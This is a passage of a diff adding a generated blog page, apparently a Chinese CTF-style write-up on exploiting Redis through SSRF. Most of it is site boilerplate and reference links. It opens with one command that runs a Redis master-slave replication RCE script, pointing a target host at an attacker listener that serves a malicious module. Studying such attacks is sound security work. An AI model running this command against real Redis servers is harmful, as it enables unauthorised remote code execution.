+python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so
+</code></pre></div>
+<p><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">参考—redis 主从复制 漏洞详细利用原理和利用代码编写方式</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/11221756.html">参考—浅析Redis中SSRF的利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whowhenhow5/article/details/121331789">参考例题—网鼎杯 2020 玄武组 SSRFMe</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web-ssrf/">web ssrf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/03/22/LeetCode/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LeetCode</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/15/ssrf/">
+                        <span class="hidden-mobile">SSRF 服务器端请求伪造</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+<a href="http://www.beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">苏ICP备2021015436号-1</a>
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
